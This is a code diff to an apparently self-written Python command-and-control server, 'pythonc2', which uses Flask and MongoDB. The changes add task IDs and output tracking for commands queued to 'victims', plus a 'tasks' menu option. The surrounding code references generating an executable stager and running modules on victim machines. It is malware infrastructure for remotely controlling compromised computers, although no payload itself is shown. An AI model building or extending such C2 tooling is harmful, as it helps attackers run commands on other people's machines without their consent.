@@ -7,7 +7,8 @@ from flask import Flask,request
 import pymongo
 import re
 import datetime
-
+import random
+import string
 
 def generate_stager():
 	## Convert to exe and save
@@ -57,7 +58,8 @@ def exit_db(myclient):
 def insert_cmd_db(myclient,cmd,victim_id):
 	mydb = myclient["pythonc2"]
 	mycol = mydb["commands"]
-	h = {'victim_id': victim_id,'command':cmd}
+	task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
+	h = {'victim_id': victim_id, 'task_id': task_id,'command':cmd, 'output':"",'issued': False}
 	mycol.insert_one(h)
 
 
@@ -87,6 +89,7 @@ def display_victim_info(victim):
 	get_victim_status(victim['lastseen'])
 
 	return victim
+
 ## Gets the various info of the victim. Trigerred by the info command.
 def get_victim_info(myclient,victim_id):
 	mydb = myclient['pythonc2']
@@ -96,6 +99,7 @@ def get_victim_info(myclient,victim_id):
 		return victim
 	else:
 		return False
+
 def show_victim_info(victim):
 	for key in victim.keys():
 		if key != '_id':
@@ -132,9 +136,15 @@ def show_supported_modules(myclient,victim_id):
 		print(modules[platform])
 	else:
 		print("Something is wrong, Victim not found.")
+def show_task_info(myclient,victim_id):
+	mydb = myclient["pythonc2"]
+	cmds = mydb["commands"]
+	x = cmds.find({'victim_id': victim_id})
 
+	for cmd in x:
+		print(cmd)
 def display_victim_help_menu():
-	commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'back': 'Go back to main menu.'}
+	commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','back': 'Go back to main menu.'}
 
 	for command in commands.keys():
 		print(command + " ---> " + commands[command])
@@ -159,6 +169,8 @@ def victim_menu(myclient,victim_id):
 				print('Command not supported. See the supported ones by running modules command')
 		elif cmd == 'modules':
 			show_supported_modules(myclient,victim_id)
+		elif cmd == 'tasks':
+			show_task_info(myclient,victim_id)
 		elif cmd == 'back':
 			print("Going back to main menu...")
 			return
